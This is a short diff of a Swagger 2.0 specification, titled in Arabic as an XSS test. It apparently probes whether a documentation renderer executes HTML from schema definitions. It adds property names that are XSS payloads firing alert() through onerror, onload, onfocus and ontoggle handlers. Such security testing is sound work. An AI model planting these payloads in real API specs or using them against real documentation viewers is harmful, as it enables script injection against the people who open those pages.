@@ -1,10 +1,16 @@
 swagger: '2.0'
 info:
-  title: "اختبار ثغرة XSS"
+  title: "اختبار تنفيذ XSS"
   version: "1.0.0"
-paths: {}  # هذا مطلوب لـ Swagger 2.0
+paths: {}
 definitions:
-  test:
+  xss_test:
     properties:
-      "<img src=x onerror=alert('XSS')>":
+      "<img src=x onerror=alert('XSS_onerror')>":
+        type: "string"
+      "<svg onload=alert('XSS_onload')>":
+        type: "string"
+      "<input autofocus onfocus=alert('XSS_onfocus')>":
+        type: "string"
+      "<details open ontoggle=alert('XSS_ontoggle')>":
         type: "string"
